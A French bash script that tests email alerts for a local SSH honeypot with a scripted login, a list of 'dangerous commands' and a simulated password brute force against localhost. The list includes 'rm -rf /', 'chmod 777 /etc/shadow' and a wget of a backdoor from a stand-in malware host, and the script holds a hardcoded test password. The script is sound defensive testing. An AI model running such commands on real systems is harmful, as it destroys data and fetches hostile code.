#!/bin/bash

echo "╔════════════════════════════════════════════════════════╗"
echo "║     🧪 TEST COMPLET DES ALERTES EMAIL               ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

# Vérifier si le honeypot est lancé
if ! docker-compose ps | grep -q "honeypot.*Up"; then
    echo "❌ Le honeypot n'est pas lancé !"
    echo ""
    echo "Lance-le d'abord avec:"
    echo "  ./LANCER_HONEYPOT.sh"
    echo ""
    exit 1
fi

echo "✅ Honeypot détecté"
echo ""
echo "📧 Ce script va déclencher plusieurs alertes email:"
echo ""
echo "  1. ✅ Connexion SSH réussie"
echo "  2. 💀 Commandes dangereuses (rm, sudo, etc.)"
echo "  3. ⚠️  Tentatives multiples (brute force)"
echo ""
echo "Tu devrais recevoir un email pour chaque alerte !"
echo ""
read -p "Appuie sur ENTRÉE pour continuer..."

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "TEST 1: Connexion SSH réussie"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📧 Ceci devrait envoyer un email de connexion réussie..."
echo ""

# Test de connexion SSH
sshpass -p "admin123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@localhost "whoami; pwd; ls; exit" 2>/dev/null

if [ $? -eq 0 ]; then
    echo "✅ Connexion SSH réussie"
    echo "   ➜ Email 1 envoyé !"
else
    echo "⚠️  Connexion SSH échouée (mais c'est peut-être normal)"
    echo "   Essaie manuellement:"
    echo "   ssh admin@localhost -p 2222"
    echo "   Mot de passe: admin123"
fi

sleep 2

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "TEST 2: Commandes dangereuses"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📧 Ceci devrait envoyer plusieurs emails de commandes dangereuses..."
echo ""

# Liste de commandes dangereuses à tester
DANGEROUS_COMMANDS=(
    "rm -rf /"
    "sudo su"
    "passwd root"
    "chmod 777 /etc/shadow"
    "wget http://malware.com/backdoor.sh"
)

for cmd in "${DANGEROUS_COMMANDS[@]}"; do
    echo "💀 Test: $cmd"
    sshpass -p "admin123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@localhost "$cmd" 2>/dev/null
    sleep 1
done

echo ""
echo "✅ Commandes dangereuses testées"
echo "   ➜ Plusieurs emails envoyés !"

sleep 2

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "TEST 3: Tentatives de connexion multiples (Brute Force)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📧 Ceci devrait envoyer un email d'alerte de brute force..."
echo ""

# Tentatives de connexion avec différents mots de passe
PASSWORDS=("wrongpass1" "wrongpass2" "wrongpass3" "wrongpass4" "wrongpass5" "wrongpass6")

for pass in "${PASSWORDS[@]}"; do
    echo "🔑 Tentative avec: $pass"
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@localhost "echo test" 2>/dev/null
    sleep 0.5
done

echo ""
echo "✅ Tentatives de brute force simulées"
echo "   ➜ Email d'alerte envoyé !"

echo ""
echo "╔════════════════════════════════════════════════════════╗"
echo "║     ✅ TESTS TERMINÉS                                 ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
echo "📧 Vérifie maintenant ton email Gmail:"
echo "   → https://mail.google.com/"
echo "   → honeypotprojet@gmail.com"
echo ""
echo "Tu devrais avoir reçu plusieurs emails détaillant:"
echo "  • Les connexions réussies"
echo "  • Les commandes dangereuses exécutées"
echo "  • Les tentatives de brute force"
echo ""
echo "⚠️  Si tu ne vois rien:"
echo "   - Attends 1-2 minutes"
echo "   - Vérifie les SPAMS"
echo "   - Vérifie les logs: docker-compose logs -f"
echo ""

